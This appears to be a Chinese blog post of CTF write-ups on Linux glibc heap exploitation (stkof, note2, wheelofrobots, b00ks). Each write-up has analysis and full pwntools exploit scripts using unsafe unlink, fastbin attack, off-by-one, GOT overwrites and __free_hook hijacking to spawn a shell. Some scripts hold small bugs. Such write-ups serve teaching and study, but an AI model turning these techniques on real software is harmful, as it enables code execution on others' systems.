---
title: 浅析 linux_heap 利用
categories:
  - linux_pwn
tags:
  - Null
---

在今年早些时候，我曾看过 `house of orange` 这种利用方式，但是当时并没有完完整整的读过 `malloc`、`free`、`malloc_consolidate` 等有关于内存分配的函数。

最近读了这些函数的源码，本来准备写一个详细分析各种技巧的文章，但是代码量有点大啊，逐行的分析可能有点麻烦（主要是懒），所以我决定以题目的实际情况做具体利用分析，有什么不对的地方望大佬指出。



# 0x1 漏洞原理

`linux` 堆利用的漏洞原理，可以看 [`how2heap`](<https://github.com/shellphish/how2heap>) 上面的一些讲解，以及通过 `glibc` 源码进行具体分析，这里就不进行赘述了。



# 0x2 漏洞利用

好吧，我们直接开始刷题吧。



## 0x21 stkof && unsafe_unlink && fastbin attack

日常 `checksec` ：

```sh
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

从这里我们可以知道程序并没有开启 `PIE` ，还可以写入 `got` 表。

### 0x211 程序分析

首先分析一下整个程序的流程。

![stkof_process](/image/2019-05-24-linux_pwn_heap/stkof_process.png)

这里所有的 chunk 在 `bss` 有一个变量（`chunk_ptr_list`）进行统一的存储，存在一个 `chunk` 的计数器。

这里可以利用的地方主要有三个。

1. 存在创建任意大小的 `chunk` 。
2. 可以给我们所创建的 `chunk` 写入任意大小的字符串（`heap_overflow`）。
3. `chunk` 的计数器在创建 `chunk` 的时候增加，删除 `chunk` 的时候，没有变化？



### 0x212 漏洞利用

这里我想到了两种稍微简单的利用思路，这里总结一下。

##### 第一种思路 && unsafe_unlink

1. 创建三个属于 `smallbin` 链表的 `chunk`，
2. 通过 `heap_overflow` 将第二个 `chunk` 置为 `free` 状态。
3. 使用 `unlink` 将 `bss` 段上存储第二个 `chunk` 的位置覆盖为  `chunk_ptr_list - 0x8`
4. 这个时候我们可以对 `chunk_ptr_list[2]` 进行写入，覆盖掉整个 `chunk_ptr_list`。

```c
chunk_ptr_list[1] = free_got;
chunk_ptr_list[2] = atol_got;
chunk_ptr_list[3] = puts_got;
```

5. 将 `free_got` 修改为 `puts_plt`，然后调用 `free`（`puts_got`） 释放掉 `chunk_ptr_list[3]`，得到 `libc` 的基地址。
6. 通过 `libc` 的基地址得到 `system` 函数的地址，然后使用 `4` 调用 `atol` 函数，输入 `/bin/bash` 得到 `shell`。

`poc` ：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def make_chunk(exp_file, chunk_size):
    exp_file.sendline("1")
    exp_file.sendline(str(chunk_size))
    exp_file.recvuntil("OK")


def write_chunk(exp_file, chunk_nums, write_length, write_value):
    exp_file.sendline("2")
    exp_file.sendline(str(chunk_nums))
    exp_file.sendline(str(write_length))
    exp_file.send(str(write_value))
    exp_file.recvuntil("OK")


def delete_chunk(exp_file, chunk_nums,):
    exp_file.sendline("3")
    exp_file.sendline(str(chunk_nums))
    exp_file.recvuntil("OK")


def main():
    debug = 1
    if debug:
        exp_file = process("/root/Desktop/a679df07a8f3a8d590febad45336d031-stkof")
        elf_file = ELF("/root/Desktop/a679df07a8f3a8d590febad45336d031-stkof")
        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # use unsafe_unlink to changed the address of chunk_ptr_list[2] to &chunk_ptr_list - 0x8
    make_chunk(exp_file, 0x20)
    make_chunk(exp_file, 0x100)
    make_chunk(exp_file, 0x100)
    payload_1 = p64(0x0) + p64(0x100)
    payload_1 += p64(0x0000000000602140 + 0x10 - 0x18) + p64(0x0000000000602140 + 0x10 - 0x10)
    payload_1 += "a" * (0x100 - 0x20)
    payload_1 += p64(0x100) + p64(0x110)
    write_chunk(exp_file, 2, 0x110, payload_1)
    delete_chunk(exp_file, 3)

    # Change the free_got to puts_plt, and get the base address of libc.
    payload_2 = p64(0x1) * 2 + p64(elf_file.got['free']) + p64(elf_file.got['atol']) + p64(elf_file.got['puts'])
    write_chunk(exp_file, 2, 0x28, payload_2)
    payload_3 = p64(elf_file.plt['puts'])
    write_chunk(exp_file, 1, 0x8, payload_3)
    exp_file.sendline("3")
    exp_file.sendline(str(3))
    libc_addr = u64(exp_file.recvuntil("OK")[1:7] + "\x00\x00") - libc_file.symbols['puts']
    system_addr = libc_file.symbols['system'] + libc_addr

    # Change the atol_got to system_addr
    payload_4 = p64(system_addr)
    write_chunk(exp_file, 2, 0x8, payload_4)

    # Trigger system("/bin/bash")
    exp_file.sendline("4")
    exp_file.sendline("/bin/bash")

    exp_file.interactive()


if __name__ == '__main__':
    main()
```



##### 第二种思路 && fastbin attack

1. 利用 `heap_overflow` 修改 `fastbin` 链表将 `chunk` 分配到 `bss` 段
2. 然后利用 `2` 进行任意长度输入，覆盖掉整个 `chunk_ptr_list` 。

```c
chunk_ptr_list[1] = free_got;
chunk_ptr_list[2] = atol_got;
chunk_ptr_list[3] = puts_got;
```

3. 剩下的和 第一种思路 相同。

`poc` ：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def make_chunk(exp_file, chunk_size):
    exp_file.sendline("1")
    exp_file.sendline(str(chunk_size))
    exp_file.recvuntil("OK")


def write_chunk(exp_file, chunk_nums, write_length, write_value):
    exp_file.sendline("2")
    exp_file.sendline(str(chunk_nums))
    exp_file.sendline(str(write_length))
    exp_file.send(str(write_value))
    exp_file.recvuntil("OK")


def delete_chunk(exp_file, chunk_nums):
    exp_file.sendline("3")
    exp_file.sendline(str(chunk_nums))
    exp_file.recvuntil("OK")


def main():
    debug = 1
    if debug:
        exp_file = process("/root/Desktop/a679df07a8f3a8d590febad45336d031-stkof")
        elf_file = ELF("/root/Desktop/a679df07a8f3a8d590febad45336d031-stkof")
        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # make many chunk becouse we need change the chunk_ptr_counts to 0x21
    make_chunk(exp_file, 0x100)
    for counts in range(0x2, 0x21):
        make_chunk(exp_file, 0x10)

    # use fastbin attack alloc the chunk to &chunk_ptr_counts - 0x8
    delete_chunk(exp_file, 0x11)
    payload_1 = p64(0x0) * 2
    payload_1 += p64(0x0) + p64(0x21)
    payload_1 += p64(0x0000000000602100 - 0x8) * 1 + p64(0x1)
    write_chunk(exp_file, 0x10, 0x30, payload_1)
    make_chunk(exp_file, 0x10)
    make_chunk(exp_file, 0x10)

    # Change the free_got to puts_plt, and get the base address of libc.
    payload_2 = p64(0x11) * 8 + p64(elf_file.got['free']) + p64(elf_file.got['atol']) + p64(elf_file.got['puts'])
    write_chunk(exp_file, 0x22, 0x58, payload_2)
    payload_3 = p64(elf_file.plt['puts'])
    write_chunk(exp_file, 1, 0x8, payload_3)
    exp_file.sendline("3")
    exp_file.sendline(str(3))
    libc_addr = u64(exp_file.recvuntil("OK")[1:7] + "\x00\x00") - libc_file.symbols['puts']
    system_addr = libc_file.symbols['system'] + libc_addr

    # Change the atol_got to system_addr
    payload_4 = p64(system_addr)
    write_chunk(exp_file, 2, 0x8, payload_4)

    # Trigger system("/bin/bash")
    exp_file.sendline("4")
    exp_file.sendline("/bin/bash")

    exp_file.interactive()


if __name__ == '__main__':
    main()
```



## 0x22 note2 && unsafe_unlink

首先 `checksec` :

```sh
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

从上述信息中简单分析一下得到了两个比较有用的信息。

1. 没有开启 `PIE` 。 
2. 可以修改 `got` 表。



### 0x221 程序分析

简单的 `fuzz` 过后，我得到了整个程序的流程。

![note2_process](/image/2019-05-24-linux_pwn_heap/note2_process.png)

很明显这是一道很典型的菜单题，漏洞主要出在向 `chunk` 写数据这个函数：

![write_value_function](/image/2019-05-24-linux_pwn_heap/write_value_function.png)

这里的漏洞主要在，当传入的 `chunk_size` 为 `0` 的时候，由于是 `unsorted_bin` 所以这里的 `chunk_size - 1` 会被看成一个很大的数，所以这里相当于是一个 `heap_overflow` 。

由于本题的限制条件，只能创建 4 个 `chunk` ， 而且 `edit_chunk` 里面使用了 `strncat` 函数（相当于写入的字节不能存在零字节），所以基本排除了 `fastbin attack`，这里限制了 `chunk`的大小（`chunk_size < 0x80`），所以这里这里使用 `unsafe_unlink` 似乎是最好的选择了。



### 0x222 漏洞利用

在程序分析中提到了使用 `unsafe_unlink` 是最好的选择了，这里具体说明一下怎样触发 `unlink` 的操作。

1. 首先创建三个的 `chunk`，大小分别为 `0x80`、`0x0`、`0x80`。（这里的 `0x0` 通过 `malloc` 还是会申请一个 0x20 大小的 chunk）
2. 当创建第一个 `chunk` 的时候将 `fake chunk` 构建好。（在 create_chunk 函数中可以写入零字节）
3. `free` 掉第二个 `chunk` 。（使其加入到 `fastbin` ，这里为了再次执行 `create_chunk` 构建触发 `unlink` 的条件）
4. 重新创建一个大小为 `0x0` 的 `chunk`，构建出触发 `unlink` 的条件。（由于上一步将其加入到 `fastbin` 中，这里再一次申请既可以写入零字节，又可以 `heap_overflow`。）
5. 泄露并计算 `libc` 的基地址。
6. 通过泄露的地址，将 `system` 写入到 `atoi_got` 中。
7. 执行 `atoi(“/bin/bash”)` 。（相当于 `system(“/bin/bash”)`）

`poc` ：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def init_infomation(exp_file):
    exp_file.recvuntil("Input your name:")
    exp_file.sendline("ybslzwa")
    exp_file.recvuntil("Input your address:")
    exp_file.sendline("ybslzwa")


def create_chunk(exp_file, chunk_size, chunk_contents):
    exp_file.recvuntil("option--->>")
    exp_file.sendline("1")
    exp_file.recvuntil("Input the length of the note content:(less than 128)")
    exp_file.sendline(str(chunk_size))
    exp_file.recvuntil("Input the note content:")
    exp_file.sendline(str(chunk_contents))
    exp_file.recvuntil("note add success")


def show_chunk(exp_file, chunk_nums):
    exp_file.recvuntil("option--->>")
    exp_file.sendline("2")
    exp_file.recvuntil("Input the id of the note:")
    exp_file.sendline(str(chunk_nums))


def edit_chunk(exp_file, chunk_nums, chunk_choise, chunk_contents):
    exp_file.recvuntil("option--->>")
    exp_file.sendline("3")
    exp_file.recvuntil("Input the id of the note:")
    exp_file.sendline(str(chunk_nums))
    exp_file.recvuntil("do you want to overwrite or append?[1.overwrite/2.append]")
    exp_file.sendline(str(chunk_choise))
    # exp_file.recvuntil("Input the note content:")
    time.sleep(0.1)
    exp_file.sendline(chunk_contents)
    exp_file.recvuntil("Edit note success!")


def delete_chunk(exp_file, chunk_nums):
    exp_file.recvuntil("option--->>")
    exp_file.sendline("4")
    exp_file.recvuntil("Input the id of the note:")
    exp_file.sendline(str(chunk_nums))
    exp_file.recvuntil("delete note success!")


def main():
    debug = 1
    if debug:
        exp_file = process("/root/Desktop/note2")
        elf_file = ELF("/root/Desktop/note2")
        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        # context.log_level = "debug"
        # attach(exp_file, "break *0x0000000000401067")

    init_infomation(exp_file)

    # use unsafe_unlink to changed the address of chunk_ptr_list[2] to &chunk_ptr_list - 0x18
    payload_1 = p64(0x0) + p64(0x61)
    payload_1 += p64(0x0000000000602120 - 0x18) + p64(0x0000000000602120 - 0x10)
    create_chunk(exp_file, 0x40, payload_1)
    create_chunk(exp_file, 0x0, "ybslzwa")
    create_chunk(exp_file, 0x80, "ybslzwa")
    delete_chunk(exp_file, 1)
    payload_2 = p64(0x1) * 2
    payload_2 += p64(0x60) + p64(0x90)
    create_chunk(exp_file, 0x0, payload_2)
    delete_chunk(exp_file, 2)

    # change the chunk_list_ptr[0] to &chunk_list_ptr[3]
    payload_3 = "a" * 8 * 3
    payload_3 += p64(0x602138)
    edit_chunk(exp_file, 0, 1, payload_3)

    # leak the base address of libc, change the atoi_got to address of system
    payload_4 = p64(elf_file.got['atoi'])
    edit_chunk(exp_file, 0, 1, payload_4)
    show_chunk(exp_file, 3)
    libc_addr = u64(exp_file.recvuntil("\n1.")[12:18]+"\x00"*2)-libc_file.symbols['atoi']
    system_addr = libc_addr + libc_file.symbols['system']
    payload_5 = p64(system_addr)
    edit_chunk(exp_file, 3, 1, payload_5)

    # Trigger atoi("/bin/bash") -> system("/bin/bash")
    exp_file.recvuntil("option--->>")
    exp_file.sendline("/bin/bash")

    exp_file.interactive()


if __name__ == '__main__':
    main()
```



## 0x23 wheelofrobots && unsafe unlink …

日常 checksec 一下：

```sh
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

简单的分析一下，得到以下结论：没有开启 `PIE`，可以修改 `got` 表。



### 0x231 程序分析

老规矩，先上的流程图。

![wheelofrobots_process](/image/2019-05-24-linux_pwn_heap/wheelofrobots_process.png)

经过简单的分析，现在将一些函数存在的问题进行一个简单的说明。

`create_robots`：

1. 在选择创建 robots 的时候存在一个 `off by one` 漏洞，可以恰好溢出到第二种类型的 `robot` 的 `inuse` 位，这里的 `inuse` 不是指的 `chunk` 的 `inuse`，而是程序作者为每个 `robot` 创建的 `inuse` 。

注意：这里一共可以创建 三个 `robot` 。

`delete_robots`：

1. 这里删除 `robot` 的时候，并没有清空在 `.bss` 保存的地址。
2. 同时也没有清空保存当前类型 `robot` 的 `chunk` 大小值的地址。 

`show_robots`：

1. 这个函数只有当创建了三个 `robot` 才能够执行。
2. 这里会随机的输出这三个中的一个 `chunk` 的地址。
3. 当输出了地址，就会调用 `exit` 函数退出。（相当于这里基本不可用了）



### 0x232 漏洞利用

有个上面三个函数中的问题，我们就可以总结利用一下思路了。

1. 首先利用我们可以利用 `off by one` 实现 `fastbin attack`
2. 利用 `fastbin attack` 可以将堆分配到 `.bss` 保存 `size` 的位置，实现 `heap overflow` 。

3. 利用 `unlink` 将保存 `chunk ptr` 的进行修改，实现任意地址写入。
4. 利用 `任意地址写入` 修改 `got 表` ，得到 `shell` 。

`poc` :

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def create_robots(exp_file, robots_nums, robots_name_len=null):
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(1))
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(robots_nums))
    if robots_nums == 2:
        exp_file.recvuntil("Increase Bender's intelligence:")
        exp_file.sendline(str(robots_name_len))
    elif robots_nums == 3:
        exp_file.recvuntil("Increase Robot Devil's cruelty: ")
        exp_file.sendline(str(robots_name_len))
    elif robots_nums == 6:
        exp_file.recvuntil("Increase Destructor's powerful: ")
        exp_file.sendline(str(robots_name_len))
    else:
        return


def delete_robots(exp_file, robots_nums):
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(2))
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(robots_nums))


def edit_robots(exp_file, robots_nums, content_value):
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(3))
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(robots_nums))
    exp_file.recvuntil("Robot's name:")
    exp_file.send(content_value)


def overwrite_inuse(exp_file, inuse_nums):
    payload_1 = "a"*4 + inuse_nums
    create_robots(exp_file, payload_1)


def main():
    debug = 1
    if debug:
        exp_file = process("./wheelofrobots")
        elf_file = ELF("./wheelofrobots")
        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # This is use "UAF" to make some memmory to trigger "fastbin attack"
    create_robots(exp_file, 2, 1)
    delete_robots(exp_file, 2)
    overwrite_inuse(exp_file, "\x01")
    payload_1 = p32(0x0000000000603138)
    edit_robots(exp_file, 2, payload_1)
    create_robots(exp_file, 3, 0x21)

    # Trigger fastbin attack
    create_robots(exp_file, 1)
    overwrite_inuse(exp_file, "\x00")
    create_robots(exp_file, 2, 1)

    # Let robots_counts empty
    delete_robots(exp_file, 1)
    delete_robots(exp_file, 3)

    # Now, we need use heap_overflow to make some memory to trigger unsafe_unlink
    create_robots(exp_file, 6, 3)
    payload_2 = p64(0x500)
    edit_robots(exp_file, 2, payload_2)
    create_robots(exp_file, 3, 7)
    payload_3 = p64(0x0) + p64(0x41)
    payload_3 += p64(0x00000000006030E8 - 0x18) + p64(0x00000000006030E8 - 0x10) + p64(0x20)
    payload_3 += "a" * (0x40 - len(payload_3))
    payload_3 += p64(0x40) + p64(0xa0)
    edit_robots(exp_file, 6, payload_3)

    # Trigger unlink
    delete_robots(exp_file, 3)
    create_robots(exp_file, 4)

    # Leak the base address of libc and write the address of the system function to atoi in the got table
    payload_4 = p64(0x0) * 2
    payload_4 += p64(elf_file.got['free'])
    payload_4 += p64(elf_file.got['atoi'])
    payload_4 += p64(elf_file.got['puts'])
    edit_robots(exp_file, 6, payload_4)
	payload_5 = p64(elf_file.plt['puts'])
    edit_robots(exp_file, 4, payload_5)
	delete_robots(exp_file, 2)
    libc_file.address = u64(exp_file.recv(6) + "\x00"*2) - libc_file.symbols['puts']
    payload_6 = p64(libc_file.symbols['system'])
    edit_robots(exp_file, 6, payload_6)

    # excute atoi("/bin/bash") >> system("/bin/bash")
    exp_file.recvuntil("Your choice :")
    exp_file.sendline("bash")
    exp_file.interactive()


if __name__ == '__main__':
    main()
```



### 0x233 遇到的坑

调试这个程序的时候我遇到一个很坑的问题，就是我一直对着 `glibc_2.23` 原版的源码进行参照进行调试的，但是这样就遇见问题了，unlink 的时候报了一个错误，错误信息为： `corrupted size vs. prev_size` ，但是我在 `glibc_2.23` 原版源码中并没有发现这句错误信息，这样就很烦。

经过一段时间的挣扎，我发现 `ubuntu 16.04` 自带的 `libc` 虽然也是 `glibc_2.23` 的，但是它是打过一些补丁的，所以和原版的 `glibc_2.23` 是有一定的区别的。具体的对比参考 [**这里**](<https://launchpad.net/ubuntu/+source/glibc>) 。



## 0x24 b00ks && off by one

日常 `checksec` :

```sh
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

除了 `canary` 没有开，全部都开了，难道这个题是栈溢出？



### 0x241 程序分析

简单的 fuzz 过后得到整个程序的流程图。

![b00ks_process](/image/2019-05-24-linux_pwn_heap/b00ks_process.jpg)

很难受，并没有发现这个程序存在栈溢出，但是发现了一个可以正好写入一个字节的地方。

![b00ks_write_value_fuction](/image/2019-05-24-linux_pwn_heap/b00ks_write_value_fuction.png)

这个输入函数，由于使用不当，所以存在着 `off by one` 的漏洞，`book` 结构题存在着两个通过 `malloc` 申请的 `chunk` ，只要控制的好是可以触发 `unlink` 的，但是这里是开启了 `PIE` ，这种比较困难，所以只有另辟蹊径了。



### 0x242 漏洞利用

刚才讲到了这个程序存在着 `off by one` 的漏洞，但是触发 unlink 条件比较苛刻，所以只能换一种法子了。

在程序的`.bss` 段我发现了 `author_name` 这个变量，正好可以利用 `off by one` 覆盖 `book_list` 两个字节。

![b00ks_3](/image/2019-05-24-linux_pwn_heap/b00ks_3.png)

如上所述，基本思路就出来了。

1. 首先向 `author_name` 写入 `0x20` 个字节。
2. 然后利用 `create_book` 创建第一个 `book` 。
3. 使用 `print_chunk` 将第一个 `book` 结构体的地址打印出来。

4. 利用得到的地址，构建内存空间，控制 `book` 结构体。
5. 利用 `unsorted bin` 的 `free` 掉后的特性，泄露 `libc` 的基地址。
6. 更改 `__free_hook` 变量的地址为 `one_gadget` 。
7. 触发 `free`/`one_gadget` 。

`poc` ：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def set_into(exp_file, author_name):
    exp_file.recvuntil("Enter author name: ")
    exp_file.sendline(author_name)


def create_book(exp_file, book_name_size, book_name=null, book_description_size=null, book_description=null):
    exp_file.recvuntil(">")
    exp_file.sendline(str(1))
    exp_file.recvuntil("Enter book name size:")
    exp_file.sendline(str(book_name_size))
    try:
        exp_file.recvuntil("Enter book name (Max 32 chars):", timeout=0.2)
        exp_file.sendline(book_name)
        exp_file.recvuntil("Enter book description size:")
        exp_file.sendline(str(book_description_size))
        exp_file.recvuntil("Enter book description:", timeout=0.2)
        exp_file.sendline(book_description)
    except Exception as e:
        pass


def delete_book(exp_file, book_id):
    exp_file.recvuntil(">")
    exp_file.sendline(str(2))
    exp_file.recvuntil("Enter the book id you want to delete:")
    exp_file.sendline(str(book_id))


def edit_book(exp_file, book_id, book_description):
    exp_file.recvuntil(">")
    exp_file.sendline(str(3))
    exp_file.recvuntil("Enter the book id you want to edit:")
    exp_file.sendline(str(book_id))
    exp_file.recvuntil("Enter new book description: ")
    exp_file.sendline(book_description)


def print_book(exp_file):
    exp_file.recvuntil(">")
    exp_file.sendline(str(4))


def change_old_author_name(exp_file, new_author_name):
    exp_file.recvuntil(">")
    exp_file.sendline(str(5))
    exp_file.recvuntil("Enter author name:")
    exp_file.sendline(new_author_name)


def main():
    debug = 1
    if debug:
        file_name = "/root/Desktop/b00ks"
        exp_file = process(file_name)
        elf_file = ELF(file_name)
        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # author_name to extend to book_list, and get address of book_1.
    payload_1 = "a" * 0x20
    set_into(exp_file, payload_1)
    create_book(exp_file, 0x40, "a" * 0x8, 0x50, "b" * 0x8)
    print_book(exp_file)
    book_1_addr = u64(exp_file.recvuntil("1. Create a book").split("Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")[1][:6]+"\x00"*2)
    book_2_fake_addr = book_1_addr + 0x30
    log.info("book_1_addr:{addr}".format(addr=hex(book_1_addr)))

    # build some memory space to make a fake book_2, and leak base address of libc.
    delete_book(exp_file, 1)
    payload_2 = p64(0x2) + p64(book_2_fake_addr + 0x70)
    payload_2 += p64(book_2_fake_addr) + p64(0x40)
    create_book(exp_file, 0x30, payload_2, 0x20, "b" * 0x8)
    change_old_author_name(exp_file, payload_1)
    create_book(exp_file, 0xd0, "a" * 0x8, 0x20, "b" * 0x8)
    delete_book(exp_file, 3)
    print_book(exp_file)
    main_arena_0x58 = u64(exp_file.recvuntil("\nDescription:").split("Name: ")[1][:6]+"\x00"*2)
    main_arena = main_arena_0x58 - 0x58
    libc_addr = main_arena_0x58 - 0x3c4b78
    free_hook = libc_addr + 0x3c67a8
    one_gadget_addr = libc_addr + 0x4526a  # execve("/bin/sh", rsp+0x30, environ)
    log.info("main_arena_0x68:{addr}".format(addr=hex(main_arena_0x58)))
    log.info("libc_addr:{addr}".format(addr=hex(libc_addr)))

    # use address of one_gadget overwrite the memory space of __free_hook
    payload_3 = p64(0x2) + p64(book_2_fake_addr + 0x70)
    payload_3 += p64(free_hook) + p64(0x40)
    edit_book(exp_file, 2, payload_3)

    payload_3 = p64(one_gadget_addr)
    edit_book(exp_file, 2, payload_3)

    # trigger one_gadget
    exp_file.recvuntil(">")
    exp_file.sendline("2")
    exp_file.recvuntil("Enter the book id you want to delete:")
    exp_file.sendline("2")

    exp_file.interactive()


if __name__ == '__main__':
    main()
```



### 0x243 其他的思路

这里我学习到了一个其他思路，`malloc` 有两种具体的分配内存的方式，一种是 `sbrk` ，另外一种是 `mmap` ，当第一次从 `mmap` 分配内存的时候，这里得到的 `chunk` 地址和 `glibc` 加载的基地址的偏移量始终相同（不同的机器偏移量可能不同）。

所以，这里的思路可以修改为：

1. 首先向 `author_name` 写入 `0x20` 个字节。
2. 然后利用 `create_book` 创建第一个 `book` 。
3. 使用 `print_chunk` 将第一个 `book` 结构体的地址打印出来。
4. 利用得到的地址，构建内存空间，控制 `book` 结构体。
5. 利用 `mmap` 的的特性（申请足够大的 `name` 或 `description` ），泄露 `libc` 的基地址。
6. 更改 `__free_hook` 变量的地址为 `one_gadget` 。
7. 触发 `free`/`one_gadget` 。

`poc` :

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def set_into(exp_file, author_name):
    exp_file.recvuntil("Enter author name: ")
    exp_file.sendline(author_name)


def create_book(exp_file, book_name_size, book_name=null, book_description_size=null, book_description=null):
    exp_file.recvuntil(">")
    exp_file.sendline(str(1))
    exp_file.recvuntil("Enter book name size:")
    exp_file.sendline(str(book_name_size))
    try:
        exp_file.recvuntil("Enter book name (Max 32 chars):", timeout=0.2)
        exp_file.sendline(book_name)
        exp_file.recvuntil("Enter book description size:")
        exp_file.sendline(str(book_description_size))
        exp_file.recvuntil("Enter book description:", timeout=0.2)
        exp_file.sendline(book_description)
    except Exception as e:
        pass


def delete_book(exp_file, book_id):
    exp_file.recvuntil(">")
    exp_file.sendline(str(2))
    exp_file.recvuntil("Enter the book id you want to delete:")
    exp_file.sendline(str(book_id))


def edit_book(exp_file, book_id, book_description):
    exp_file.recvuntil(">")
    exp_file.sendline(str(3))
    exp_file.recvuntil("Enter the book id you want to edit:")
    exp_file.sendline(str(book_id))
    exp_file.recvuntil("Enter new book description: ")
    exp_file.sendline(book_description)


def print_book(exp_file):
    exp_file.recvuntil(">")
    exp_file.sendline(str(4))


def change_old_author_name(exp_file, new_author_name):
    exp_file.recvuntil(">")
    exp_file.sendline(str(5))
    exp_file.recvuntil("Enter author name:")
    exp_file.sendline(new_author_name)


def main():
    debug = 1
    if debug:
        file_name = "/root/Desktop/b00ks"
        exp_file = process(file_name)
        elf_file = ELF(file_name)
        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        # attach(exp_file, "break *exit")

    # author_name to extend to book_list, and get address of book_1.
    payload_1 = "a" * 0x20
    set_into(exp_file, payload_1)
    create_book(exp_file, 0x40, "a" * 0x8, 0x50, "b" * 0x8)
    print_book(exp_file)
    book_1_addr = u64(exp_file.recvuntil("1. Create a book").split("Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")[1][:6]+"\x00"*2)
    book_2_fake_addr = book_1_addr + 0x30
    log.info("book_1_addr:{addr}".format(addr=hex(book_1_addr)))

    # build some memory space to make a fake book_2, and leak base address of libc.
    delete_book(exp_file, 1)
    payload_2 = p64(0x2) + p64(book_2_fake_addr - 0xd8)
    payload_2 += p64(book_2_fake_addr) + p64(0x40)
    create_book(exp_file, 0x30, payload_2, 0x20, "b" * 0x8)
    change_old_author_name(exp_file, payload_1)
    create_book(exp_file, 0x21000, "a" * 0x8, 0x21000, "b" * 0x8)
    # delete_book(exp_file, 3)
    print_book(exp_file)
    mmap_adder = u64(exp_file.recvuntil("\nDescription:").split("Name: ")[1][:6]+"\x00"*2)
    libc_addr = mmap_adder - 0x5b1010  # the offset is address of mmap to base address of libc.
    free_hook = libc_addr + 0x3c67a8
    one_gadget_addr = libc_addr + 0x4526a  # execve("/bin/sh", rsp+0x30, environ)
    log.info("libc_addr:{addr}".format(addr=hex(libc_addr)))

    # use address of one_gadget overwrite the memory space of __free_hook
    payload_3 = p64(0x2) + p64(book_2_fake_addr + 0x70)
    payload_3 += p64(free_hook) + p64(0x40)
    edit_book(exp_file, 2, payload_3)

    payload_3 = p64(one_gadget_addr)
    edit_book(exp_file, 2, payload_3)

    # trigger one_gadget
    exp_file.recvuntil(">")
    exp_file.sendline("2")
    exp_file.recvuntil("Enter the book id you want to delete:")
    exp_file.sendline("2")
    exp_file.sendline("6")

    exp_file.interactive()


if __name__ == '__main__':
    main()
```

